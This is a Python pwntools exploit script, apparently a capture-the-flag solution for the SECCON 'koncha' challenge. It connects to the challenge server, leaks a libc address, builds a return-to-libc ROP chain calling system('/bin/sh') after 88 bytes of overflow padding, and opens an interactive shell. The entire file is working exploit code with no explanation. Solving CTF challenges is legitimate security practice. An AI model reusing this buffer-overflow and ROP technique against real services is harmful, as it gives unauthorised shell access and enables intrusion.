from pwn import *
from time import sleep


p = remote('koncha.seccon.games',9001)

p.recv()
p.sendline()
sleep(1)

resp = p.recv()
leaked = u64(resp[resp.find(b'\xe8'): resp.find(b'\x7f') + 1].ljust(8, b'\x00'))

print(f"Leaked addr: {leaked}")

libc_addr = leaked - 0x1f12e8
pop_rdi = libc_addr + 0x00123b49
bin_sh = leaked - 0x3cd2b
ret_addr = pop_rdi + 0x1
system_addr = leaked - 0x19f058

payload = cyclic(88) + p64(pop_rdi) + p64(bin_sh) + p64(ret_addr) + p64(system_addr)

print(f"PAYLOAD: {payload}")

p.sendline(payload)
p.interactive()
